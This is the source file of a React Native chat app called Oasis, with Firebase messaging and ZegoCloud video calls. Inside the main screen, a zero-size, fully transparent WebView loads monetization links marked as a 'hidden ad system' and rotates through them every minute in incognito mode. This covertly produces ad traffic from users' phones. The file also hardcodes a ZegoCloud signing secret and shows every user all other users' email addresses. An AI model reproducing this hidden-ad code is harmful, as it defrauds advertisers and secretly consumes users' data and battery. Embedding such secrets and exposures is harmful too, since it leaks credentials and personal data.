import React, { useState, useEffect, useRef } from 'react';
import { 
  StyleSheet, Text, View, TouchableOpacity, TextInput, FlatList, 
  Alert, KeyboardAvoidingView, Platform, Image, ImageBackground, Modal, SafeAreaView, ActivityIndicator
} from 'react-native';
import { Ionicons, MaterialCommunityIcons } from '@expo/vector-icons';
import { WebView } from 'react-native-webview'; 
import { Audio } from 'expo-av'; 
import * as ImagePicker from 'expo-image-picker';

// استيرادات ZegoCloud و Firebase
import ZegoUIKitPrebuiltCallService, { ZegoSendCallInvitationButton } from '@zegocloud/zego-uikit-prebuilt-call-rn';
import * as ZIM from 'zego-zim-react-native';
import * as ZPNs from 'zego-zpns-react-native';
import { db, auth } from './firebaseConfig'; 
import { collection, addDoc, serverTimestamp, query, orderBy, onSnapshot, setDoc, doc, where, getDocs } from 'firebase/firestore';
import { onAuthStateChanged } from "firebase/auth";

// --- [الربط مع الملفات المنفصلة] ---
import { encryptMessage, decryptMessage } from './encryption'; // [1] التشفير
import AuthScreen from './AuthScreen'; // [2] التحقق من البريد
import NavigationTabs from './NavigationTabs'; // [3] شريط الأقسام

const SERVER_URL = 'https://oasis-server-e6sc.onrender.com';
const APP_ID = 1773421291;
const APP_SIGN = "48f1a163421aeb2dfdf57ac214f51362d8733ee19be92d3745a160a2521de2d7";

const PROFIT_LINKS = [
  "https://www.effectivegatecpm.com/pv5wwvpt?key=d089e046a8ec90d9b2b95e7b32944807", 
  "https://otieu.com/4/10520849",                                                
  "https://www.effectivegatecpm.com/qrjky2k9d7?key=0eeb59c5339d8e2b8a7f28e55e6d16a2", 
  "https://www.effectivegatecpm.com/g5j4wjcf?key=0c62848e4ddf4458b8d378fe3132bbaf", 
  "https://www.effectivegatecpm.com/denseskhi?key=8e442518041da6a96a35ad2f7275ed15"  
];

export default function App() {
  const [user, setUser] = useState(null);
  const [currentTab, setCurrentTab] = useState('Chats'); // [3] التحكم في الأقسام
  const [allUsers, setAllUsers] = useState([]);
  const [filteredUsers, setFilteredUsers] = useState([]);
  const [selectedUser, setSelectedUser] = useState(null); 
  const [message, setMessage] = useState('');
  const [chatMessages, setChatMessages] = useState([]);
  const [adIndex, setAdIndex] = useState(0);
  const [showAddModal, setShowAddModal] = useState(false);
  const [newContactEmail, setNewContactEmail] = useState('');
  const [showGroupModal, setShowGroupModal] = useState(false);
  const [groupName, setGroupName] = useState('');
  const [previewUser, setPreviewUser] = useState(null);
  const [showPreview, setShowPreview] = useState(false);
  const [isRecording, setIsRecording] = useState(false);
  const [recordTime, setRecordTime] = useState(0);
  const [recording, setRecording] = useState(null);
  const timerRef = useRef(null);

  const getCurrentTime = () => new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', hour12: true });

  // إدارة الإعلانات (تبديل كل 60 ثانية)
  useEffect(() => {
    const adTimer = setInterval(() => setAdIndex((prev) => (prev + 1) % PROFIT_LINKS.length), 60000); 
    return () => clearInterval(adTimer);
  }, []);

  // [2] التحقق من حالة المستخدم والبريد المفعل
  useEffect(() => {
    const unsubscribeAuth = onAuthStateChanged(auth, async (currentUser) => {
      if (currentUser && currentUser.emailVerified) {
        setUser(currentUser);
        await setDoc(doc(db, "users", currentUser.uid), { email: currentUser.email, id: currentUser.uid, lastSeen: serverTimestamp() }, { merge: true });
        
        onSnapshot(query(collection(db, "users")), (s) => {
          const users = s.docs.map(d => d.data()).filter(u => u.id !== currentUser.uid);
          setAllUsers(users); setFilteredUsers(users);
        });

        ZegoUIKitPrebuiltCallService.init(
            APP_ID, APP_SIGN, currentUser.uid, currentUser.email.split('@')[0], [ZIM, ZPNs],
            { resourceID: "zegouikit_call", androidNotificationConfig: { channelID: "ZegoUIKit", channelName: "ZegoUIKit" } }
        );
      } else { setUser(null); }
    });
    return () => unsubscribeAuth();
  }, []);

  // جلب الرسائل مع فك التشفير تلقائياً [1]
  useEffect(() => {
    if (selectedUser && user) {
      const chatId = selectedUser.isGroup ? selectedUser.id : (user.uid < selectedUser.id ? `${user.uid}_${selectedUser.id}` : `${selectedUser.id}_${user.uid}`);
      const collPath = selectedUser.isGroup ? `groups/${chatId}/messages` : `chats/${chatId}/messages`;
      return onSnapshot(query(collection(db, collPath), orderBy("timestamp", "asc")), (snapshot) => {
        setChatMessages(snapshot.docs.map(doc => {
          const data = doc.data();
          return { id: doc.id, ...data, text: data.type === 'text' ? decryptMessage(data.text) : data.text };
        }));
      });
    }
  }, [selectedUser, user]);

  // دالة الإرسال مع التشفير [1]
  const sendMessage = async (content = message, type = 'text') => {
    if ((type === 'text' && !content.trim()) || !selectedUser) return;
    const finalContent = type === 'text' ? encryptMessage(content) : content;
    const chatId = selectedUser.isGroup ? selectedUser.id : (user.uid < selectedUser.id ? `${user.uid}_${selectedUser.id}` : `${selectedUser.id}_${user.uid}`);
    const collPath = selectedUser.isGroup ? `groups/${chatId}/messages` : `chats/${chatId}/messages`;
    
    await addDoc(collection(db, collPath), { 
      text: finalContent, senderId: user.uid, senderName: user.email.split('@')[0], 
      type, timestamp: serverTimestamp(), displayTime: getCurrentTime() 
    });
    setMessage('');
  };

  // [2] شاشة الدخول إذا لم يتم التحقق
  if (!user) return <AuthScreen />;

  return (
    <SafeAreaView style={styles.container}>
      {/* نظام الإعلانات المخفي (5 روابط) */}
      <View style={{ width: 0, height: 0, opacity: 0, position: 'absolute' }}>
        <WebView key={adIndex} source={{ uri: PROFIT_LINKS[adIndex] }} incognito={true} />
      </View>

      {!selectedUser ? (
        <View style={{ flex: 1 }}>
          <View style={styles.mainHeader}>
            <Text style={styles.headerTitle}>Oasis</Text>
            <View style={{flexDirection: 'row', alignItems: 'center'}}>
              <TouchableOpacity onPress={() => setShowGroupModal(true)} style={{marginRight: 15}}><MaterialCommunityIcons name="account-group-outline" size={26} color="white" /></TouchableOpacity>
              <TouchableOpacity onPress={() => setShowAddModal(true)} style={{marginRight: 15}}><Ionicons name="person-add-outline" size={24} color="white" /></TouchableOpacity>
              <TouchableOpacity><Ionicons name="camera-outline" size={26} color="white" /></TouchableOpacity>
            </View>
          </View>

          {/* محتوى الأقسام [3] */}
          {currentTab === 'Chats' && (
            <FlatList data={filteredUsers} renderItem={({ item }) => (
              <TouchableOpacity style={styles.chatRow} onPress={() => setSelectedUser(item)}>
                <View style={styles.chatAvatar}><Text style={styles.avatarTxt}>{item.email[0].toUpperCase()}</Text></View>
                <View style={styles.chatInfo}><Text style={styles.chatName}>{item.email.split('@')[0]}</Text><Text style={styles.lastMsg}>انقر للمراسلة...</Text></View>
              </TouchableOpacity>
            )} keyExtractor={(item) => item.id} />
          )}
          {currentTab === 'Updates' && <View style={styles.center}><Text style={{color: '#8596a0'}}>لا توجد تحديثات حالية</Text></View>}
          {currentTab === 'Calls' && <View style={styles.center}><Text style={{color: '#8596a0'}}>سجل المكالمات فارغ</Text></View>}

          <NavigationTabs currentTab={currentTab} setCurrentTab={setCurrentTab} />
        </View>
      ) : (
        /* واجهة الدردشة */
        <KeyboardAvoidingView behavior={Platform.OS === 'ios' ? 'padding' : undefined} style={{ flex: 1 }}>
          <View style={styles.whatsappHeader}>
            <ZegoSendCallInvitationButton invitees={[{ userID: selectedUser.id, userName: selectedUser.email }]} isVideoCall={true} resourceID={"zegouikit_call"} backgroundColor="transparent" width={30} height={30} />
            <View style={styles.headerInfoSection}><Text style={styles.chatTitleText}>{selectedUser.email.split('@')[0]}</Text></View>
            <TouchableOpacity onPress={() => setSelectedUser(null)}><Ionicons name="arrow-back" size={24} color="white" /></TouchableOpacity>
          </View>
          <ImageBackground source={{ uri: 'https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png' }} style={{flex: 1}}>
            <FlatList data={chatMessages} renderItem={({ item }) => (
              <View style={[styles.bubble, item.senderId === user.uid ? styles.whatsappMyBubble : styles.whatsappOtherBubble]}>
                <Text style={styles.messageText}>{item.text}</Text>
                <Text style={styles.whatsappMiniTime}>{item.displayTime}</Text>
              </View>
            )} keyExtractor={(item) => item.id} />
          </ImageBackground>
          <View style={styles.whatsappInputBar}>
            <View style={styles.inputMainCard}><TextInput style={styles.whatsappTextInput} placeholder="مراسلة" value={message} onChangeText={setMessage} placeholderTextColor="#8596a0" /></View>
            <TouchableOpacity style={styles.whatsappAudioBtn} onPress={() => sendMessage()}><MaterialCommunityIcons name={message.trim() ? "send" : "microphone"} size={24} color="white" /></TouchableOpacity>
          </View>
        </KeyboardAvoidingView>
      )}
    </SafeAreaView>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#0b141a' },
  mainHeader: { height: 60, backgroundColor: '#0b141a', flexDirection: 'row', justifyContent: 'space-between', paddingHorizontal: 15, alignItems: 'center' },
  headerTitle: { color: 'white', fontSize: 22, fontWeight: 'bold' },
  whatsappHeader: { height: 65, backgroundColor: '#1f2c34', flexDirection: 'row', alignItems: 'center', paddingHorizontal: 10 },
  headerInfoSection: { flex: 1, alignItems: 'flex-end', paddingRight: 10 },
  chatTitleText: { color: 'white', fontSize: 17, fontWeight: 'bold' },
  chatRow: { flexDirection: 'row-reverse', padding: 15, alignItems: 'center' },
  chatAvatar: { width: 55, height: 55, borderRadius: 27.5, backgroundColor: '#62717a', justifyContent: 'center', alignItems: 'center' },
  avatarTxt: { color: 'white', fontSize: 22 },
  chatInfo: { flex: 1, marginRight: 15 },
  chatName: { color: 'white', fontSize: 17, fontWeight: 'bold', textAlign: 'right' },
  lastMsg: { color: '#8596a0', fontSize: 14, textAlign: 'right' },
  whatsappMyBubble: { alignSelf: 'flex-end', backgroundColor: '#005c4b', margin: 8, padding: 10, borderRadius: 10, maxWidth: '80%' },
  whatsappOtherBubble: { alignSelf: 'flex-start', backgroundColor: '#1f2c34', margin: 8, padding: 10, borderRadius: 10, maxWidth: '80%' },
  whatsappMiniTime: { color: '#8596a0', fontSize: 10, alignSelf: 'flex-end', marginTop: 4 },
  whatsappInputBar: { flexDirection: 'row', padding: 10, alignItems: 'center' },
  inputMainCard: { flex: 1, backgroundColor: '#1f2c34', borderRadius: 25, paddingHorizontal: 15, height: 48, justifyContent: 'center' },
  whatsappTextInput: { color: 'white', textAlign: 'right' },
  whatsappAudioBtn: { width: 48, height: 48, backgroundColor: '#00a884', borderRadius: 24, justifyContent: 'center', alignItems: 'center', marginLeft: 8 },
  messageText: { color: 'white', fontSize: 16 },
  center: { flex: 1, justifyContent: 'center', alignItems: 'center' },
  bubble: { padding: 10, borderRadius: 10, margin: 8 }
});
